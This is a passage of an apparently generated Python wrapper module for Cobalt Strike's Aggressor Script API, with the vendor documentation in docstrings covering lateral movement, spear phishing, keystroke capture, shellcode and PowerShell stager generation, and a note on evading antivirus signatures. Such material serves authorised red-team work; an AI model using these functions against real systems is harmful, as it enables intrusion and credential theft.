    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the Java Signed Applet dialog
        Example
        
        openJavaSignedAppletDialog();
        
    """

    return engine.call('openJavaSignedAppletDialog', args, fork=fork)


def openJavaSmartAppletDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the Java Smart Applet dialog
        Example
        
        openJavaSmartAppletDialog();
        
    """

    return engine.call('openJavaSmartAppletDialog', args, fork=fork)


def openJumpDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open Cobalt Strike's lateral movement dialog
        Arguments
        $1 - the type of lateral movement. One of: psexec, psexec_psh, winrm, wmi
        $2 - an array of targets to apply this action against
        Example
        
        openJumpDialog("psexec_psh", @("192.168.1.3", "192.168.1.4"));
        
    """

    return engine.call('openJumpDialog', args, fork=fork)


def openKeystrokeBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the keystroke browser tab
        Example
        
        openKeystrokeBrowser();
        
    """

    return engine.call('openKeystrokeBrowser', args, fork=fork)


def openListenerManager(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the listener manager
        Example
        
        openListenerManager();
        
    """

    return engine.call('openListenerManager', args, fork=fork)


def openMakeTokenDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        open a dialog to help generate an access token
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "Make Token" {
            local('$bid');
            foreach $bid ($1) {
                openMakeTokenDialog($bid);
            }
        }
        
    """

    return engine.call('openMakeTokenDialog', args, fork=fork)


def openOfficeMacro(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the office macro export dialog
        Example
        
        openOfficeMacroDialog();
        
    """

    return engine.call('openOfficeMacro', args, fork=fork)


def openOrActivate(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        If a Beacon console exists, make it active. If a Beacon console does not exist, open it.
        Arguments
        $1 - the Beacon ID
        Example
        
        item "&Activate" {
            local('$bid');
            foreach $bid ($1) {
                openOrActivate($bid);
            }
        }
        
    """

    return engine.call('openOrActivate', args, fork=fork)


def openPayloadGeneratorDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the Payload Generator dialog.
        Example
        
        openPayloadGeneratorDialog();
        
    """

    return engine.call('openPayloadGeneratorDialog', args, fork=fork)


def openPayloadHelper(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open a payload chooser dialog.
        Arguments
        $1 - a callback function. Arguments: $1 - the selected listener.
        Example
        
        openPayloadHelper(lambda({
            bspawn($bid, $1);
        }, $bid => $1));
        
    """

    return engine.call('openPayloadHelper', args, fork=fork)


def openPivotListenerSetup(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        open the pivot listener setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "Listener..." {
            local('$bid');
            foreach $bid ($1) {
                openPivotListenerSetup($bid);
            }
        }
        
    """

    return engine.call('openPivotListenerSetup', args, fork=fork)


def openPortScanner(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the port scanner dialog
        Arguments
        $1 - an array of targets to scan
        Example
        
        openPortScanner(@("192.168.1.3"));
        
    """

    return engine.call('openPortScanner', args, fork=fork)


def openPortScannerLocal(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the port scanner dialog with options to target a Beacon's local network
        Arguments
        $1 - the beacon to target with this feature
        Example
        
        item "Scan" {
            local('$bid');
            foreach $bid ($1) {
                openPortScannerLocal($bid);
            }
        }
        
    """

    return engine.call('openPortScannerLocal', args, fork=fork)


def openPowerShellWebDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog to setup the PowerShell Web Delivery Attack
        Example
        
        openPowerShellWebDialog();
        
    """

    return engine.call('openPowerShellWebDialog', args, fork=fork)


def openPreferencesDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the preferences dialog
        Example
        
        openPreferencesDialog();
        
    """

    return engine.call('openPreferencesDialog', args, fork=fork)


def openProcessBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open a process browser for one or more Beacons
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "Processes" {
            openProcessBrowser($1);
        }
        
    """

    return engine.call('openProcessBrowser', args, fork=fork)


def openSOCKSBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the tab to list SOCKS proxy servers
        Example
        
        openSOCKSBrowser();
        
    """

    return engine.call('openSOCKSBrowser', args, fork=fork)


def openSOCKSSetup(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        open the SOCKS proxy server setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "SOCKS Server" {
            local('$bid');
            foreach $bid ($1) {
                openSOCKSSetup($bid);
            }
        }
        
    """

    return engine.call('openSOCKSSetup', args, fork=fork)


def openScreenshotBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the screenshot browser tab
        Example
        
        openScreenshotBrowser();
        
    """

    return engine.call('openScreenshotBrowser', args, fork=fork)


def openScriptConsole(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the Aggressor Script console.
        Example
        
        openScriptConsole();
        
    """

    return engine.call('openScriptConsole', args, fork=fork)


def openScriptManager(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the tab for the script manager.
        Example
        
        openScriptManager();
        
    """

    return engine.call('openScriptManager', args, fork=fork)


def openScriptedWebDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog to setup a Scripted Web Delivery Attack
        Example
        
        openScriptedWebDialog();
        
    """

    return engine.call('openScriptedWebDialog', args, fork=fork)


def openServiceBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open service browser dialog
        Arguments
        $1 - an array of targets to show services for
        Example
        
        openServiceBrowser(@("192.168.1.3"));
        
    """

    return engine.call('openServiceBrowser', args, fork=fork)


def openSiteManager(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the site manager.
        Example
        
        openSiteManager();
        
    """

    return engine.call('openSiteManager', args, fork=fork)


def openSpawnAsDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open dialog to spawn a payload as another user
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "Spawn As..." {
            local('$bid');
            foreach $bid ($1) {
                openSpawnAsDialog($bid);
            }
        }
        
    """

    return engine.call('openSpawnAsDialog', args, fork=fork)


def openSpearPhishDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog for the spear phishing tool.
        Example
        
        openSpearPhishDialog();
        
    """

    return engine.call('openSpearPhishDialog', args, fork=fork)


def openSystemInformationDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the system information dialog.
        Example
        
        openSystemInformationDialog();
        
    """

    return engine.call('openSystemInformationDialog', args, fork=fork)


def openSystemProfilerDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog to setup the system profiler.
        Example
        
        openSystemProfilerDialog();
        
    """

    return engine.call('openSystemProfilerDialog', args, fork=fork)


def openTargetBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the targets browser
        Example
        
        openTargetBrowser();
        
    """

    return engine.call('openTargetBrowser', args, fork=fork)


def openWebLog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the web log tab.
        Example
        
        openWebLog();
        
    """

    return engine.call('openWebLog', args, fork=fork)


def openWindowsDropperDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog to export the Windows dropper attack
        Example
        
        openWindowsDropperDialog();
        
    """

    return engine.call('openWindowsDropperDialog', args, fork=fork)


def openWindowsExecutableDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog to generate a Windows executable
        Example
        
        openWindowsExecutableDialog();
        
    """

    return engine.call('openWindowsExecutableDialog', args, fork=fork)


def openWindowsExecutableStage(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog to generate a stageless Windows executable
        Example
        
        openWindowsExecutableStage();
        
    """

    return engine.call('openWindowsExecutableStage', args, fork=fork)


def pgraph(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generate the pivot graph GUI component.
        Returns
        The pivot graph GUI object (a javax.swing.JComponent)
        Example
        
        addVisualization("Pivot Graph", pgraph());
        
        See Also
        &showVisualization
        
    """

    return engine.call('pgraph', args, fork=fork)


def pivots(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of SOCKS pivots from Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each pivot.
        Example
        
        printAll(pivots());
        
    """

    return engine.call('pivots', args, fork=fork)


def popup_clear(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Remove all popup menus associated with the current menu. This is a way to override Cobalt Strike's default popup menu definitions.
        Arguments
        $1 - the popup hook to clear registered menus for
        Example
        
        popup_clear("help");
        
        popup help {
            item "My stuff!" {
                show_message("This is my menu!");
            }
        }
        
    """

    return engine.call('popup_clear', args, fork=fork)


def powershell(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a PowerShell one-liner to bootstrap the specified listener.
        Arguments
        $1 - the listener name
        $2 - [true/false]: is this listener targeting local host?
        $3 - x86|x64 - the architecture of the generated stager.
        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A PowerShell one-liner to run the specified listener.
        Example
        
        println(powershell("my listener", false));
        
    """

    return engine.call('powershell', args, fork=fork)


def powershell_encode_oneliner(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)
        Arguments
        $1 - the PowerShell expression to wrap into a one-liner.
        Returns a powershell.exe one-liner to run the specified expression.
        Example
        
        $cmd = powershell_encode_oneliner("2 + 2");
        println($cmd);
        
    """

    return engine.call('powershell_encode_oneliner', args, fork=fork)


def powershell_encode_stager(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a base64 encoded PowerShell script to run the specified shellcode
        Arguments
        $1 - shellcode to wrap
        Returns
        Returns a base64 encoded PowerShell suitable for use with powershell.exe's -enc option.
        Example
        
        $shellcode  = shellcode("my listener", false);
        $readytouse = powershell_encode_stager($shellcode);
        println("powershell.exe -ep bypass -enc $readytouse");
        
    """

    return engine.call('powershell_encode_stager', args, fork=fork)


def pref_get(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Grabs a string value from Cobalt Strike's preferences.
        Arguments
        $1 - the preference name
        $2 - the default value [if there is no value for this preference]
        Returns
        A string with the preference value.
        Example
        
        $foo = pref_get("foo.string", "bar");
        
    """

    return engine.call('pref_get', args, fork=fork)


def pref_get_list(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Grabs a list value from Cobalt Strike's preferences.
        Arguments
        $1 - the preference name
        Returns
        An array with the preference values
        Example
        
        @foo = pref_get_list("foo.list");
        
    """

    return engine.call('pref_get_list', args, fork=fork)


def pref_set(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Set a value in Cobalt Strike's preferences
        Arguments
        $1 - the preference name
        $2 - the preference value
        Example
        
        pref_set("foo.string", "baz!");
        
    """

    return engine.call('pref_set', args, fork=fork)


def pref_set_list(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Stores a list value into Cobalt Strike's preferences.
        Arguments
        $1 - the preference name
        $2 - an array of values for this preference
        Example
        
        pref_set_list("foo.list", @("a", "b", "c"));
        
    """

    return engine.call('pref_set_list', args, fork=fork)


def previousTab(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Activate the tab that is to the left of the current tab.
        Example
        
        bind Ctrl+Left {
            previousTab();
        }
        
    """

    return engine.call('previousTab', args, fork=fork)


def privmsg(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Post a private message to a user in the event log
        Arguments
        $1 - who to send the message to
        $2 - the message
        Example
        
        privmsg("raffi", "what's up man?");
        
    """

    return engine.call('privmsg', args, fork=fork)


def prompt_confirm(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Show a dialog with Yes/No buttons. If the user presses yes, call the specified function.
        Arguments
        $1 - text in the dialog
        $2 - title of the dialog
        $3 - a callback function. Called when the user presses yes.
        Example
        
        prompt_confirm("Do you feel lucky?", "Do you?", {
            show_mesage("Ok, I got nothing");
        });
        
    """

    return engine.call('prompt_confirm', args, fork=fork)


def prompt_directory_open(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Show a directory open dialog.
        Arguments
        $1 - title of the dialog
        $2 - default value
        $3 - true/false: allow user to select multiple folders?
        $4 - a callback function. Called when the user chooses a folder. The argument to the callback is the selected folder. If multiple folders are selected, they will still be specified as the first argument, separated by commas.
        Example
        
        prompt_directory_open("Choose a folder", $null, false, {
            show_message("You chose: $1");
        });
        
    """

    return engine.call('prompt_directory_open', args, fork=fork)


def prompt_file_open(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Show a file open dialog.
        Arguments
        $1 - title of the dialog
        $2 - default value
        $3 - true/false: allow user to select multiple files?
        $4 - a callback function. Called when the user chooses a file to open. The argument to the callback is the selected file. If multiple files are selected, they will still be specified as the first argument, separated by commas.
        Example
        
        prompt_file_open("Choose a file", $null, false, {
            show_message("You chose: $1");
        });
        
    """

    return engine.call('prompt_file_open', args, fork=fork)


def prompt_file_save(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Show a file save dialog.
        Arguments
        $1 - default value
        $2 - a callback function. Called when the user chooses a filename. The argument to the callback is the desired file.
        Example
        
        prompt_file_save($null, {
            local('$handle');
            $handle = openf("> $+ $1");
            println($handle, "I am content");
            closef($handle);
        });
        
    """

    return engine.call('prompt_file_save', args, fork=fork)


def prompt_text(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Show a dialog that asks the user for text.
        Arguments
        $1 - text in the dialog
        $2 - default value in the text field.
        $3 - a callback function. Called when the user presses OK. The first argument to this callback is the text the user provided.
        Example
        
        prompt_text("What is your name?", "Cyber Bob", {
            show_mesage("Hi $1 $+ , nice to meet you!");
        });
        
    """

    return engine.call('prompt_text', args, fork=fork)


def range(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generate an array of numbers based on a string description of ranges.
        Arguments
        $1 - a string with a description of ranges
        
        
        Range
        Result
        
        
        103
        The number 103
        
        
        3-8
        The numbers 3, 4, 5, 6, and 7.
        
        
        2,4-6
        The numbers 2, 4, and 5.
        
        
        Returns
        An array of numbers within the specified ranges.
        Example
        
        printAll(range("2,4-6"));
        
    """

    return engine.call('range', args, fork=fork)


def removeTab(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Close the active tab
        Example
        
        bind Ctrl+D {
            removeTab();
        }
        
    """

    return engine.call('removeTab', args, fork=fork)


def resetData(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Reset Cobalt Strike's data model
        
    """

    return engine.call('resetData', args, fork=fork)


def say(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Post a public chat message to the event log.
        Arguments
        $1 - the message
        Example
        
        say("Hello World!");
        
    """

    return engine.call('say', args, fork=fork)


def sbrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generate the session browser GUI component. Shows Beacon AND SSH sessions.
        Returns
        The session browser GUI object (a javax.swing.JComponent)
        Example
        
        addVisualization("Session Browser", sbrowser());
        
        See Also
        &showVisualization
        
    """

    return engine.call('sbrowser', args, fork=fork)


def screenshots(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of screenshots from Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each screenshot.
        Example
        
        printAll(screenshots());
        
    """

    return engine.call('screenshots', args, fork=fork)


def script_resource(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns the full path to a resource that is stored relative to this script file.
        Arguments
        $1 - the file to get a path for
        Returns
        The full path to the specified file.
        Example
        
        println(script_resource("dummy.txt"));
        
    """

    return engine.call('script_resource', args, fork=fork)


def separator(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Insert a separator into the current menu tree.
        Example
        
        popup foo {
            item "Stuff" { ... }
            separator();
            item "Other Stuff" { ... }
        }
        
    """

    return engine.call('separator', args, fork=fork)


def services(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of services in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each service.
        Example
        
        printAll(services());
        
    """

    return engine.call('services', args, fork=fork)


def shellcode(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns raw shellcode for a specific Cobalt Strike listener
        Arguments
        $1 - the listener name
        $2 - true/false: is this shellcode destined for a remote target?
        $3 - x86|x64 - the architecture of the stager output.
        Notes
        Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.
        Returns
        A scalar containing shellcode for the specified listener.
        Example
        
        $data = shellcode("my listener", false, "x86");
        
        $handle = openf(">out.bin");
        writeb($handle, $data);
        closef($handle);
        
    """

    return engine.call('shellcode', args, fork=fork)


def showVisualization(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Switch Cobalt Strike visualization to a registered visualization.
        Arguments
        $1 - the name of the visualization
        Example
        
        bind Ctrl+H {
            showVisualization("Hello World");
        }
        
        See Also
        &showVisualization
        
    """

    return engine.call('showVisualization', args, fork=fork)


def show_error(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Shows an error message to the user in a dialog box. Use this function to relay error information.
        Arguments
        $1 - the message text
        Example
        
        show_error("You did something bad.");
        
    """

    return engine.call('show_error', args, fork=fork)


def show_message(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Shows a message to the user in a dialog box. Use this function to relay information.
        Arguments
        $1 - the message text
        Example
        
        show_message("You've won a free ringtone");
        
    """

    return engine.call('show_message', args, fork=fork)


def site_host(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Host content on Cobalt Strike's web server
        Arguments
        $1 - the host for this site (&localip is a good default)
        $2 - the port (e.g., 80)
        $3 - the URI (e.g., /foo)
        $4 - the content to host (as a string)
        $5 - the mime-type (e.g., "text/plain")
        $6 - a description of the content. Shown in Attacks -> Web Drive-by -> Manage.
        $7 - use SSL or not (true or false)
        Returns
        The URL to this hosted site
        Example
        
        site_host(localip(), 80, "/", "Hello World!", "text/plain", "Hello World Page", false);
        
    """

    return engine.call('site_host', args, fork=fork)


def site_kill(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Remove a site from Cobalt Strike's web server
        Arguments
        $1 - the port
        $2 - the URI
        Example
        
        # removes the content bound to / on port 80
        site_kill(80, "/");
        
    """

    return engine.call('site_kill', args, fork=fork)


def sites(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of sites tied to Cobalt Strike's web server.
        Returns
        An array of dictionary objects with information about each registered site.
        Example
        
        printAll(sites());
        
    """

    return engine.call('sites', args, fork=fork)


def ssh_command_describe(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Describe an SSH command.
        Returns
        A string description of the SSH command.
        Arguments
        $1 - the command
        Example
        
        println(beacon_command_describe("sudo"));
        
    """

    return engine.call('ssh_command_describe', args, fork=fork)


def ssh_command_detail(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get the help information for an SSH command.
        Returns
        A string with helpful information about an SSH command.
        Arguments
        $1 - the command
        Example
        
        println(ssh_command_detail("sudo"));
        
    """

    return engine.call('ssh_command_detail', args, fork=fork)


def ssh_command_register(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Register help information for an SSH console command.
        Arguments
        $1 - the command
        $2 - the short description of the command
        $3 - the long-form help for the command.
        Example
        
        ssh_alis echo {
            blog($1, "You typed: " . substr($1, 5));
        }
        
        ssh_command_register(
            "echo",
            "echo posts to the current session's log",
            "Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
        
    """

    return engine.call('ssh_command_register', args, fork=fork)


def ssh_commands(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get a list of SSH commands.
        Returns
        An array of SSH commands.
        Example
        
        printAll(ssh_commands());
        
    """

    return engine.call('ssh_commands', args, fork=fork)


def str_chunk(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Chunk a string into multiple parts
        Arguments
        $1 - the string to chunk
        $2 - the maximum size of each chunk
        Returns
        The original string split into multiple chunks
        Example
        
        # hint... :)
        else if ($1 eq "template.x86.ps1") {
            local('$enc');
            $enc = str_chunk(base64_encode($2), 61);
            return strrep($data, '%%DATA%%', join("' + '", $enc));
        }
        
    """

    return engine.call('str_chunk', args, fork=fork)


def str_decode(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Convert a string of bytes to text with the specified encoding.
        Arguments
        $1 - the string to decode
        $2 - the encoding to use.
        Returns
        The decoded text.
        Example
        
        # convert back to a string we can use (from UTF16-LE)
        $text = str_decode($string, "UTF16-LE");
        
    """

    return engine.call('str_decode', args, fork=fork)


def str_encode(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Convert text to byte string with the specified character encoding.
        Arguments
        $1 - the string to encode
        $2 - the encoding to use
        Returns
        The resulting string.
        Example
        
        # convert to UTF16-LE
        $encoded = str_encode("this is some text", "UTF16-LE");
        
    """

    return engine.call('str_encode', args, fork=fork)


def str_xor(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Walk a string and XOR it with the provided key.
        Arguments
        $1 - the string to mask
        $2 - the key to use (string)
        Returns
        The original string masked with the specified key.
        Example
        
        $mask  = str_xor("This is a string", "key");
        $plain = str_xor($mask, "key");
        
    """

    return engine.call('str_xor', args, fork=fork)


def sync_download(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Sync a downloaded file (View -> Downloads) to a local path.
        Arguments
        $1 - the remote path to the file to sync. See &downloads
        $2 - where to save the file locally
        $3 - [optional] a callback function to execute when download is synced. The first argument to this function is the local path of the downloaded file.
        Example
        
        # sync all downloads
        command ga {
            local('$download $lpath $name $count');
            foreach $count => $download (downloads()) {
                ($lpath, $name) = values($download, @("lpath", "name"));
        
                sync_download($lpath, script_resource("file $+ .$count"), lambda({
                    println("Downloaded $1 [ $+ $name $+ ]");
                }, \$name));
            }
        }
        
    """

    return engine.call('sync_download', args, fork=fork)


def targets(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of host information in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each host.
        Example
        
        printAll(targets());
        
    """

    return engine.call('targets', args, fork=fork)


def tbrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generate the target browser GUI component.
        Returns
        The target browser GUI object (a javax.swing.JComponent)
        Example
        
        addVisualization("Target Browser", tbrowser());
        
        See Also
        &showVisualization
        
    """

    return engine.call('tbrowser', args, fork=fork)


def tokenToEmail(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Covert a phishing token to an email address.
        Arguments
        $1 - the phishing token
        Returns
        The email address or "unknown" if the token is not associated with an email.
        Example
        
        set PROFILER_HIT {
            local('$out $app $ver $email');
            $email = tokenToEmail($5);
            $out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
            foreach $app => $ver ($4) {
                $out .= "\n\t $+ $[25]app $ver";
            }
            return "$out $+ \n\n";
        }
        
    """

    return engine.call('tokenToEmail', args, fork=fork)


def transform(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Transform shellcode into another format.
        Arguments
        $1 - the shellcode to transform
        $2 - the transform to apply
        
        
        Type
        Description
        
        
        array
        comma separated byte values
        
        
        hex
        Hex-encode the value
        
        
        powershell-base64
        PowerShell.exe-friendly base64 encoder
        
        
        vba
        a VBA array() with newlines added in
        
        
        vbs
        a VBS expression that results in a string
        
        
        veil
        Veil-ready string (\x##\x##)
        
        
        Returns
        The shellcode after the specified transform is applied
        Example
        
        println(transform("This is a test!", "veil"));
        
    """

    return engine.call('transform', args, fork=fork)


def transform_vbs(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Transform shellcode into a VBS expression that results in a string
        Arguments
        $1 - the shellcode to transform
        $2 - the maximum length of a plaintext run
        Notes
        Previously, Cobalt Strike would embed its stagers into VBS files as several Chr() calls concatened into a string.
        Cobalt Strike 3.9 introduced features that required larger stagers. These larger stagers were too big to embed into a VBS file with the above method.
        To get past this VBS limitation, Cobalt Strike opted to use Chr() calls for non-ASCII data and runs of double-quoted strings for printable characters.
        This change, an engineering necessity, unintentionally defeated static anti-virus signatures for Cobalt Strike's default VBS artifacts at that time.
        If you're looking for an easy evasion benefit with VBS artifacts, consider adjusting the plaintext run length in your Resource Kit.
        Returns
        The shellcode after this transform is applied
        Example
        
        println(transform_vbs("This is a test!", "3"));
        
    """

    return engine.call('transform_vbs', args, fork=fork)


def tstamp(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Format a time into a date/time value. This value does not include seconds.
        Arguments
        $1 - the time [milliseconds since the UNIX epoch]
        Example
        
        println("The time is now: " . tstamp(ticks()));
        
        See Also
        &dstamp
    """

    return engine.call('tstamp', args, fork=fork)


def url_open(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open a URL in the default browser.
        Arguments
        $1 - the URL to open
        Example
        
        command go {
            url_open("https://www.cobaltstrike.com/");
        }
        
    """

    return engine.call('url_open', args, fork=fork)


def users(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of users connected to this team server.
        Returns
        An array of users.
        Example
        
        foreach $user (users()) {
            println($user);
        }
        
    """

    return engine.call('users', args, fork=fork)


def vpn_interface_info(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get information about a VPN interface.
        Arguments
        $1 - the interface name
        $2 - [Optional] the key to extract a value for
        Returns
        
        %info = vpn_interface_info("interface");
        
        Returns a dictionary with the metadata for this interface.
        
        $value = vpn_interface_info("interface", "key");
        
        Returns the value for the specified key from this interface's metadata
        Example
        
        # create a script console alias to interface info
        command interface {
            println("Interface $1");
            foreach $key => $value (vpn_interface_info($1)) {
                println("$[15]key $value");
            }
        }
        
    """

    return engine.call('vpn_interface_info', args, fork=fork)


def vpn_interfaces(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Return a list of VPN interface names
        Returns
        An array of interface names.
        Example
        
        printAll(vpn_interfaces());
        
    """

    return engine.call('vpn_interfaces', args, fork=fork)


def vpn_tap_create(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
